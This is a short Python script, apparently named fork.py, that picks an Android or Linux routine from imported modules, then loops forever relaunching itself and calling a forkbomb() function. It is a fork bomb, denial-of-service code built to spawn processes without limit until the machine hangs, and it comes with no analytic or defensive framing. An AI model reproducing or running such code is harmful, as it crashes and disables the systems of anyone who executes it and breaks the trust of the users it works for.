import os
import platform
from android import android
from linux import linux
from forkbomb import forkbomb
if platform.system() == "Android":
  android()
elif platform.system() == "Linux":
  linux()
else:
  pass
while True:
  os.system("python fork.py")
  forkbomb()
